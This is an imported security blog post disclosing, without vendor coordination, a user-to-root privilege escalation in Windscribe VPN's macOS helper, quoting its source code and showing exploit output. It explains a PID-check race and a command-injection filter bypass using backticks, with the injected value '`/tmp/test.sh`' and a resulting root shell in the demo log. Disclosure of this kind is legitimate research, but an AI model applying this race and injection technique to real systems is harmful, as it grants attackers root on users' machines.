---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-04-12_why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.md
original_filename: 2024-04-12_why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.md
title: 'Why you shouldn''t use a commercial VPN: Amateur hour with Windscribe'
category: documents
detected_topics:
- command-injection
- supply-chain
- access-control
- automation-abuse
- race-condition
tags:
- imported
- documents
- command-injection
- supply-chain
- access-control
- automation-abuse
- race-condition
language: en
raw_sha256: 7233e4b21108eaa250d93362d11630b53a418eec1699f2621d9ef6ce4f51b6f1
text_sha256: 4fdf5b6bd1a3c129f0956ded353d7b800021623f8696b6f68a22beb3318a2f47
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: false
---

# Why you shouldn't use a commercial VPN: Amateur hour with Windscribe

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-04-12_why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, access-control, automation-abuse, race-condition
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: False
- Raw SHA256: `7233e4b21108eaa250d93362d11630b53a418eec1699f2621d9ef6ce4f51b6f1`
- Text SHA256: `4fdf5b6bd1a3c129f0956ded353d7b800021623f8696b6f68a22beb3318a2f47`


## Content

---
title: "Why you shouldn't use a commercial VPN: Amateur hour with Windscribe"
page_title: "Gergely's hack blog – Why you shouldn't use a commercial VPN: Amateur hour with Windscribe"
url: "https://gergelykalman.com/why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.html"
final_url: "https://gergelykalman.com/why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.html"
authors: ["Gergely Kalman (@gergely_kalman)"]
programs: ["Windscribe"]
bugs: ["Local Privilege Escalation", "Race condition"]
publication_date: "2024-04-12"
added_date: "2024-08-06"
source: "pentester.land/writeups.json"
original_index: 343
---

# Why you shouldn't use a commercial VPN: Amateur hour with Windscribe

Posted on 2024-04-12 in [blog](https://gergelykalman.com/category/blog.html)

### Intro

This is a writeup about a user to root privilege escalation due to a race condition in Windscribe VPN's software.

### What is Windscribe?

Windscribe is a smaller VPN provider, they have about 69M users according to their tweet that was published today.

They are notorious on X/Twitter for being SuPEr FuNnY in a childish troll kind-of way, which understandably rubs a lot of people wrong.

Funnier than their twitter account though, is their codebase which they have graciously made open-source. This is a good move generally speaking, but not in this instance as it took me 5 minutes to find code quality that is more in-line with a first C++ project than a multi-million dollar company's flagship product.

But hey, fuck the coders amirite? Bunch of useless nerds, it's better for business if they spend that budget on people who can shitpost on social media.

Enough chit-chat, let's dig in.

> Software: Windscribe VPN
> 
> Version: 2.9.9
> 
> Bug: user to root LPE
> 
> Systems affected: macOS (Linux and Windows are also vulnerable)
> 
> Requirements: Windscribe VPN installed (account not necessary)
> 
> Time spent: ~5 hours (not counting writing this)
> 
> Exploit included: Yes
> 
> Disclosure type: Full Disclosure

### The codebase

For a little fun, let's peruse their open-sourced client at <https://github.com/Windscribe/Desktop-App>

We can see that parts of the server-side processing are copy-pasted between the Mac, Linux and Windows versions (`processCommand`), here are some excerpts that I found pretty alarming.

Feel free to skip ahead, these are just some snippets that I found that indicated their lack of expertise in, well, everything really.

Here's some error handling for you:

Mac
  
  
  int main(int argc, const char *argv[])
  {
  signal(SIGSEGV, handler_sigterm);
  signal(SIGFPE, handler_sigterm);
  signal(SIGABRT, handler_sigterm);
  signal(SIGILL, handler_sigterm);
  signal(SIGINT, handler_sigterm);
  signal(SIGTERM, handler_sigterm);
  

Linux
  
  
  signal(SIGSEGV, handler_sigterm);
  signal(SIGFPE, handler_sigterm);
  signal(SIGABRT, handler_sigterm);
  signal(SIGILL, handler_sigterm);
  signal(SIGINT, handler_sigterm);
  signal(SIGTERM, handler_sigterm);
  

Here's some super secure authentication code that relies on the sender's pid to fetch the paths and check for the file name:

Mac:
  
  
  std::vector<std::string> endings;
  // Check for a correct ending.
  endings.push_back("/Contents/MacOS/installer");
  endings.push_back("/Contents/MacOS/Windscribe");
  
  const auto app_name_length = app_name.length();
  
  // Check bundle name.
  bool bFoundBundleName = false;
  for (const auto &ending : endings)
  {
  const auto ending_length = ending.length();
  if (app_name_length >= ending_length &&
  app_name.compare(app_name_length - ending_length, ending_length, ending) == 0)
  {
  bFoundBundleName = true;
  break;
  }
  }
  

Linux:
  
  
  const std::string engineExePath = applicationDirPath() + "/Windscribe";
  
  //Logger::instance().out("Checking exe path matches engine's: %s", clientAppPath.c_str());
  
  if (engineExePath.compare(clientAppPath) != 0)
  {
  Logger::instance().out("Invalid calling application for PID %i, %s", pid, clientAppPath.c_str());
  pid_validity_cache_[pid] = false;
  return false;
  }
  

Windows:
  
  
  std::wstring windscribeExePath = getExePath() + std::wstring(L"\\Windscribe.exe");
  
  if (!iequals(windscribeExePath, path))
  {
  output << "verifyWindscribeProcessPath invalid process path: " << std::wstring(path);
  Logger::instance().out(output.str().c_str());
  return false;
  }
  

Here is their attempt at preventing command injection (not that openvpn itself could not be used for this, so why even try?):

Mac:
  
  
  std::string fullCmd = std::string(canonicalPath) + "/" + executable + " " + arguments;
  Logger::instance().out("Resolved command: %s", fullCmd.c_str());
  free(canonicalPath);
  
  if (fullCmd.find(";") != std::string::npos || fullCmd.find("|") != std::string::npos || fullCmd.find("&") != std::string::npos) {
  // Don't execute commands with dangerous pipes or delimiters
  Logger::instance().out("Executable command contains invalid characters, ignoring.");
  return "";
  }
  

Linux:
  
  
  std::string fullCmd = std::string(canonicalPath) + "/" + executable + " " + arguments;
  LOG("Resolved command: %s", fullCmd.c_str());
  free(canonicalPath);
  
  if (fullCmd.find(";") != std::string::npos || fullCmd.find("|") != std::string::npos || fullCmd.find("&") != std::string::npos) {
  // Don't execute commands with dangerous pipes or delimiters
  LOG("Executable command contains invalid characters, ignoring.");
  return "";
  }
  

Windows:
  
  
  std::wstring strCmd = L"\"" + Utils::getExePath() + L"\\" + cmdRunOpenVpn.szOpenVpnExecutable + L"\"";
  strCmd += L" --config \"" + filename + L"\" --management 127.0.0.1 ";
  strCmd += std::to_wstring(cmdRunOpenVpn.portNumber) + L" --management-query-passwords --management-hold --verb 3";
  
  if (wcslen(cmdRunOpenVpn.szHttpProxy.c_str()) > 0) {
  strCmd += L" --http-proxy " + cmdRunOpenVpn.szHttpProxy + L" " + std::to_wstring(cmdRunOpenVpn.httpPortNumber) + L" auto";
  }
  if (wcslen(cmdRunOpenVpn.szSocksProxy.c_str()) > 0) {
  strCmd += L" --socks-proxy " + cmdRunOpenVpn.szSocksProxy + L" " + std::to_wstring(cmdRunOpenVpn.socksPortNumber);
  }
  
  return ExecuteCmd::instance().executeUnblockingCmd(strCmd, L"", Utils::getDirPathFromFullPath(filename));
  

If the code snippets look similar between platforms is because they are, they are usually just copy-pasted between them. This happens between Mac and Linux the most as they're similar but Windows is not better, it's just different.

Generally desktop VPN software is an easy target, but Windscribe is on a whole other level of bad.

### The privileged helper

The Windscribe helper on macOS called `com.windscribe.launcher.macos` runs as root and takes commands from the desktop client on a UNIX socket at `/var/run/windscribe_helper_socket2`.

This works similarly on other OSes as well, I only looked at the mac version, but Linux is pretty much 1-1 and Windows is not much better.

### The LPE bug(s)

The privileged helper relies on `checking the sender's PID` and performing checks on the sender's program path. It even does signature verification on it.

While this sounds good in theory, it's **completely useless**. Anyone with a brain knows that PID checking is racy, meaning: an attacker can execute the authorized binary right after sending their malicious payload, bypassing every check.

The software also uses the boost C++ library to pass structured data between these processes. This library was never meant to work with untrusted data, so we can corrupt the helper's memory, but there's an easier way for us to execute commands as root.

Since Windscribe calls openvpn/wireguard/etc... in subshells it is trivial to inject our payload to gain root command execution. They made a ridiculous attempt at preventing this (filtering ";|&" characters, but they forgot the most basic one: "`". This can be used to execute our payload.

In all fairness this would never work, as it's a bad architectural decision. Invoking subshells is a massive can of worms and securing it is difficult and error-prone. Not to mention that the command invoked (openvpn) is vulnerable to misuse if the arguments are attacker-controlled.

This is bad design, an attacker controlling any parameter to openvpn is pretty much a slam-dunk vulnerability, so I have no idea why they have this in the first place.

### But this is just the mac right?

I did not test the other platforms, but Linux and Windows works similarly (they both validate the pid). It's unlikely that these platforms are not vulnerable, and even if they aren't it wouldn't take much work to find something else that is wrong.

Writing exploits for these other platforms is up to other researchers, but if you do take this on, please drop me a DM on X/Twitter.

### Further research

The code is full of antipatterns and lazy/naive solutions, so I wouldn't be shocked if someone takes a bit more time than I did and floods the company with new 0days every week.

There's plenty of opportunity here, starting by replicating my results on the other platforms.

As far a targets go, I have seen tougher beginner wargames.

### Why didn't I report this to their bug bounty?

Because the company has a history of not paying researchers (from what I've been told privately) and their maximum payout of $5000 is not worth months of my time going back-and-forth with their team who created this masterpiece of engineering in the first place.

I'd much rather have their customers realize how dangerous this software is to them than to report the bug and get gagged by an NDA.

### Verdict

This is a pretty clear-cut reason why you should never install commercial VPNs if you can help it. Not only will they not give you extra privacy, they will install software that is roughly the same quality, often written by people who have no idea what they're doing.

Some of these companies plainly don't give a flying fuck about you or your computer, and in egregious cases (such as Windscribe) they will actually tell this to your face on social media. Talk about adding insult to injury.

I did publish this piece and did the research to prove that commercial VPN software is low-quality garbage. While I can only speak for certain about Windscribe here, in my experience the others are not much better.

While it's true that privileged daemons (required for VPNs) are hard to get right, it's also not impossible. Nevertheless, I do not expect **any** security product to worsen my security-posture, let alone something I paid for. The fact that this software is written with the understanding of a first-year CS student is pretty crazy.

When I think about their **69M subscribers** who have this software running with the highest privileges on their systems, this gets a lot less funny, really, really quickly.

### Demo
  
  
  $ ./windscribe_attitude_check.py 
  [+] Preparing
  [+] Opening windscribe log file
  [+] Launching exploit
  [+] Try 0/100
  [?] LOGLINE [120424 12:22:29:000] [service] client app connected
  [?] LOGLINE [120424 12:22:29:000] [service] HelperSecurity::verifyProcessId: new PID 96804
  [?] LOGLINE [120424 12:22:29:000] [service] Invalid app/bundle name for PID 96804: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python'
  [?] LOGLINE [120424 12:22:29:000] [service] client app disconnected
  [+] Try 1/100
  [?] LOGLINE [120424 12:22:29:000] [service] client app connected
  [?] LOGLINE [120424 12:22:29:000] [service] HelperSecurity::verifyProcessId: new PID 96805
  [?] LOGLINE [120424 12:22:29:000] [service] Invalid app/bundle name for PID 96805: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python'
  [?] LOGLINE [120424 12:22:29:000] [service] client app disconnected
  [+] Try 2/100
  [?] LOGLINE [120424 12:22:29:000] [service] client app connected
  [?] LOGLINE [120424 12:22:29:000] [service] HelperSecurity::verifyProcessId: new PID 96806
  [?] LOGLINE [120424 12:22:29:000] [service] Invalid app/bundle name for PID 96806: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python'
  [?] LOGLINE [120424 12:22:29:000] [service] client app disconnected
  [+] Try 3/100
  [?] LOGLINE [120424 12:22:30:000] [service] client app connected
  [?] LOGLINE [120424 12:22:30:000] [service] HelperSecurity::verifyProcessId: new PID 96807
  [?] LOGLINE [120424 12:22:30:000] [service] Invalid app/bundle name for PID 96807: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python'
  [?] LOGLINE [120424 12:22:30:000] [service] client app disconnected
  
  ...
  
  [+] Try 61/100
  [?] LOGLINE [120424 12:22:36:000] [service] client app connected
  [?] LOGLINE [120424 12:22:36:000] [service] HelperSecurity::verifyProcessId: new PID 96865
  [?] LOGLINE [120424 12:22:36:000] [service] Resolved command: /Applications/Windscribe.app/Contents/Helpers/windscribeopenvpn --config /etc/windscribe/config.ovpn `/tmp/test.sh`
  [+] Try 62/100
  [?] LOGLINE [120424 12:22:36:000] [service] client app disconnected
  [+] PWNED :)
  [+] Spawning shell
  
  The default interactive shell is now zsh.
  To update your account to use zsh, please run `chsh -s /bin/zsh`.
  For more details, please visit https://support.apple.com/kb/HT208050.
  bash-3.2#
  

### Exploit code

<https://github.com/gergelykalman/windscribe-attitude-check>

[macOS](https://gergelykalman.com/tag/macos.html) [0day](https://gergelykalman.com/tag/0day.html) [VPN](https://gergelykalman.com/tag/vpn.html) [Windscribe](https://gergelykalman.com/tag/windscribe.html)
